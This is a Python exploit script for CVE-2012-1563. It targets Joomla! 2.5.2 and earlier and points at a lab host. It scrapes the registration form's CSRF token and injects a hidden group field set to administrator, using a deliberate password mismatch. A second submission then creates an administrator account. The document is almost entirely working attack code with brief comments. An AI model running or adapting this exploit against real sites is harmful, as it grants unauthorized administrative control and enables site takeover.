# CVE-2012-1563: Joomla! <= 2.5.2 Admin Creation
# cf
 
import bs4
import requests
import random
 
 
url = &#039;http://vmweb.lan/joomla-cms-2.5.2/&#039;
form_url = url + &#039;index.php/using-joomla/extensions/components/users-component/registration-form&#039;
action_url = url + &#039;index.php/using-joomla/extensions/components/users-component/registration-form?task=registration.register&#039;
 
username = &#039;user%d&#039; % random.randrange(1000, 10000)
email = username + &#039;@yopmail.com&#039;
password = &#039;ActualRandomChimpanzee123&#039;
 
user_data = {
    &#039;name&#039;: username,
    &#039;username&#039;: username,
    &#039;password1&#039;: password,
    &#039;password2&#039;: password + &#039;XXXinvalid&#039;,
    &#039;email1&#039;: email,
    &#039;email2&#039;: email,
    &#039;groups][&#039;: &#039;7&#039;
}
 
session = requests.Session()
 
# Grab original data from the form, including the CSRF token
 
response = session.get(form_url)
soup = bs4.BeautifulSoup(response.text, &#039;lxml&#039;)
 
form = soup.find(&#039;form&#039;, id=&#039;member-registration&#039;)
data = {e[&#039;name&#039;]: e[&#039;value&#039;] for e in form.find_all(&#039;input&#039;)}
 
# Build our modified data array
 
user_data = {&#039;%s]&#039; % k: v for k, v in user_data.items()}
data.update(user_data)
 
# First request will get denied because the two passwords are mismatched
 
response = session.post(action_url, data=data)
 
# The second will work
 
data[&#039;jform[password2]&#039;] = data[&#039;jform[password1]&#039;]
del data[&#039;jform[groups][]&#039;]
response = session.post(action_url, data=data)
 
print("Account created for user: %s [%s]" % (username, email))

